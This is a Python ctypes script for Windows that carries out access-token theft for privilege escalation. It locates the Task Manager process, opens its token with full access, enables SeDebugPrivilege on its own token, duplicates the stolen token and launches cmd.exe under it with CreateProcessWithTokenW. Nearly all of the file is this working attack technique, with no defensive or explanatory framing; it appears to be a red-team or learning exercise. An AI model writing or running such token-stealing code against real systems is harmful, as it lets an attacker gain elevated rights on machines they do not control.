"""
FIndWindowA
GetWindowThreadProcessId
OpenProcess
OpenProcessToken
GetCurrentProcessId
LookupPrivilegeValueW
PrivilegeCheck
AdjustTokenPrivileges
DuplicateTokenEX
CreateProcesWithTOkenW
"""
import ctypes
from ctypes.wintypes import DWORD, HANDLE, LPWSTR, BOOL, WORD, LPBYTE

k_handle = ctypes.WinDLL("Kernel32.dll")
u_handle = ctypes.WinDLL("User32.dll")
a_handle = ctypes.WinDLL("Advapi32.dll")

# Access Rights
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
SE_PRIVILEGE_ENABLED = 0x00000002
SE_PRIVILEGE_DISABLED = 0x00000000

# Token Access Rights
STANDARD_RIGHTS_REQUIRED = 0x000F0000
STANDARD_RIGHTS_READ = 0x00020000
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATION = 0x0004
TOKEN_QUERY = 0x0008
TOKEN_QUERY_SOURCE = 0x0010
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ADJUST_GROUPS = 0x0040
TOKEN_ADJUST_DEFAULT = 0x0080
TOKEN_ADJUST_SESSIONID = 0x0100
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | 
					TOKEN_ASSIGN_PRIMARY     |
					TOKEN_DUPLICATE          |
					TOKEN_IMPERSONATION      |
					TOKEN_QUERY              |
					TOKEN_QUERY_SOURCE       |
					TOKEN_ADJUST_PRIVILEGES  |
					TOKEN_ADJUST_GROUPS      |
					TOKEN_ADJUST_DEFAULT     |
					TOKEN_ADJUST_SESSIONID)

class LUID(ctypes.Structure):
    _fields_ = [
        ("LowPart", DWORD),
        ("HighPart", DWORD)
    ]
class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
		("Luid", LUID),
		("Attributes", DWORD)
	]
class PRIVILEGE_SET(ctypes.Structure):
    _fields_ = [
		("PrivilegeCount", DWORD),
		("Control", DWORD),
		("Privileges", LUID_AND_ATTRIBUTES)
	]
class TOKEN_PRIVILEGE(ctypes.Structure):
    _fields_ = [
		("PrivilegeCount", DWORD),
		("Privileges", LUID_AND_ATTRIBUTES)
	]
class SECURITY_ATTRIBUTES(ctypes.Structure):
	_fields_ = [
	("nLength", DWORD),
	("lpSecurityDescriptor", HANDLE),
	("nInheritHandle", BOOL),
	]

class STARTUPINFO(ctypes.Structure):
	_fields_ = [
	("cb", DWORD),
	("lpReserved", LPWSTR),
	("lpDesktop", LPWSTR),
	("lpTitle", LPWSTR),
	("dwX", DWORD),
	("dxY", DWORD),
	("dwXSize", DWORD),
	("dwYSize", DWORD),
	("dwXCountChars", DWORD),
	("dwYCountChars", DWORD),
	("dwFillAttribute", DWORD),
	("dwFlags", DWORD),
	("wShowWindow", WORD),
	("cbReserved2", WORD),
	("lpReserved2", LPBYTE),
	("hStdInput", HANDLE),
	("hStdOutput", HANDLE),
	("hStdError", HANDLE),
	]
	
class PROCESS_INFORMATION(ctypes.Structure):
	_fields_ = [
	("hProcess", HANDLE),
	("hThread", HANDLE),
	("dwProcessId", DWORD),
	("dwThreadId", DWORD),
	]
    
def get_access_token(pid):
    bInheritHandle = False
    
    handle = k_handle.OpenProcess(PROCESS_ALL_ACCESS, bInheritHandle, pid)
    if handle:
        print("Got handle")
    else:
        print("[-]Cant get handle")
    
    token_handle = ctypes.c_void_p()
    response = a_handle.OpenProcessToken(handle,TOKEN_ALL_ACCESS, ctypes.byref(token_handle))
    if response != 0:
        print("Got token handle")
        return token_handle
    else:
        print("[-]Cant get token handle")

lpClassName = None
lpWindowName = "Task Manager".encode()

window_handle = u_handle.FindWindowA(lpClassName, lpWindowName)
if window_handle:
    print("Got window handle.")
else:
    print("[-]Cant get window handle")

process_id = ctypes.c_ulong()
response = u_handle.GetWindowThreadProcessId(window_handle, ctypes.byref(process_id))
if response > 0:
    print(f"Got PID: {process_id.value}")
else:
    print("[-]Cant get PID")

current_pid = k_handle.GetCurrentProcessId()
if current_pid > 0:
    print(f"Got current PID: {current_pid}")
else:
    print("Cant get current PID")

token_handle = get_access_token(process_id)    
current_token_handle = get_access_token(current_pid)

lpSystemName = None
lpName = "SEDebugPrivilege"
lpLuid = LUID()
response = a_handle.LookupPrivilegeValueW(lpSystemName, lpName, ctypes.byref(lpLuid))
if response != 0:
    print("Got LUID")
    print(f"LUID High: {lpLuid.HighPart}, LUID Low: {lpLuid.LowPart}")
else:
    print("[-]Cant get LUId")
 
required_privilege = PRIVILEGE_SET()
required_privilege.PrivilegeCount = 1
required_privilege.Privileges = LUID_AND_ATTRIBUTES()
required_privilege.Privileges.Luid = lpLuid
required_privilege.Privileges.Attributes = SE_PRIVILEGE_DISABLED

pfResult = ctypes.c_long()
   
response = a_handle.PrivilegeCheck(current_token_handle, ctypes.byref(required_privilege), ctypes.byref(pfResult))
if response != 0:
    print("Ran Priv Check")
else:
    print("[-]Cant perform priv check")
    
if pfResult:
    print(f"{lpName} is enabled")
else:
    print(f"{lpName} is disabled")
    
disable_all_privileges = False
NewState = TOKEN_PRIVILEGE()
bufferLength = ctypes.sizeof(NewState)
previousState = ctypes.c_void_p()
returnLength = ctypes.c_void_p()
NewState.PrivilegeCount = 1
NewState.Privileges = required_privilege.Privileges
    
response = a_handle.AdjustTokenPrivileges(current_token_handle, disable_all_privileges, ctypes.byref(NewState), 
                                          bufferLength, ctypes.byref(previousState), ctypes.byref(returnLength))
if response != 0:
    print("Token fliped")
else:
    print("[-]Token not fliped")
  
lpTokenAtrributes = SECURITY_ATTRIBUTES()
impersonationLevel = 2
tokenType = 1
newTokenHandle = ctypes.c_void_p()

lpTokenAtrributes.nLength = ctypes.sizeof(lpTokenAtrributes)
lpTokenAtrributes.lpSecurityDescriptor = ctypes.c_void_p()
lpTokenAtrributes.bInheritHandle = False
  
response = a_handle.DuplicateTokenEx(token_handle, TOKEN_ALL_ACCESS, 
                                     ctypes.byref(lpTokenAtrributes), impersonationLevel, tokenType, ctypes.byref(newTokenHandle))
if response != 0:
    print("Duplicated new handle")
else:
    print("[-]Cant duplicate new handle")
 
dwLogonFlags = 0x00000001
lpApplicationName = "C:\\Windows\\System32\\cmd.exe"
lpCommandLine = None
dwCreationFlags = 0x00000010
lpEnvironment = ctypes.c_void_p()
lpCurrentDirectory = None
lpStartupInfo = STARTUPINFO()
lpProcessInformation = PROCESS_INFORMATION()

lpStartupInfo.wShowWindow = 0x1
lpStartupInfo.dwFlags = 0x1
lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)
  
response = a_handle.CreateProcessWithTokenW(newTokenHandle, dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags,
                                            lpEnvironment, lpCurrentDirectory, ctypes.byref(lpStartupInfo), ctypes.byref(lpProcessInformation))
if response != 0:
    print("Created new process")
else:
    print("[-]Cant create new process")